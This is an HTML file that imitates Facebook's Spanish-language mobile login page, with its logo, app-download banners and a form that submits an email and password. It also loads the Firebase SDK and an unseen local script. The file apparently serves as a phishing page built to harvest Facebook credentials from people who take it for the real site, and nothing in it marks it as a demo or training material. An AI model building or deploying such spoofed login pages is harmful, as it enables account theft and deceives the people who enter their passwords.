<!DOCTYPE html>
<html>
<head>
	<title>Iniciar sesión en Facebook | Facebook</title>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" type="image/ico" href="favicon.ico"/>
	<link rel="shortcut icon" type="image/ico" href="http://127.0.0.1/favicon.ico"/>
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="css/style.css" />

</head>
<body>
	
	<header>
		<div class="geder">
			<p>
				<a href="index.html" class="logo">
					<img src="images/logo.png" alt="Ir a la página de inicio de Facebook">
				</a>
				<a class="register" href="#">
					Registrarte
				</a>
			</p>
		</div>
	</header>
	<div class="clearfix"></div>
	<section class="container">
		<div class="mobile-app">
			<div class="info android">
				<img src="http://i.imgur.com/3HwxdId.png" alt="">
				<p>Descarga Facebook para Android y navega más rápido</p>
			</div>
			<div class="info windows">
				<img src="http://i.imgur.com/3HwxdId.png" alt="">
				<p>Descarga Facebook para Windows Phone y navega más rápido</p>
			</div>
			<div class="info iphone">
				<img src="http://i.imgur.com/3HwxdId.png" alt="">
				<p>Descarga Facebook para iPhone y navega más rápido</p>
			</div>
		</div>
		<div class="form-wrapper">
			<form method="POST" class="login-form">
				<h3>Inicia sesión en Facebook</h3>
				<input type="email" name="email" placeholder="Correo electrónico o número de teléfono">
				<input type="password" name="password" placeholder="Contraseña">
				<div class="btn-wrapper">
					<button type="submit">Iniciar sesión</button>
					<p class="helper">
						<a href="#">
							¿Olvidaste tu cuenta?
						</a>
						·
						<a href="#">
							Registrate en Facebook
						</a>
					</p>
				</div>
			</form>
		</div>
	</section>
	<footer>
		<a href="#" class="desktop">
			<img src="images/footer.jpeg" alt="" />
		</a>
		<a href="#" class="mobile">
			<img src="images/footer-mobile.png" alt="">
		</a>
	</footer>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"
			integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
			crossorigin="anonymous"></script>
	<script src="https://www.gstatic.com/firebasejs/3.6.9/firebase.js"></script>
	<script src="js/app.js"></script>
</body>
</html>
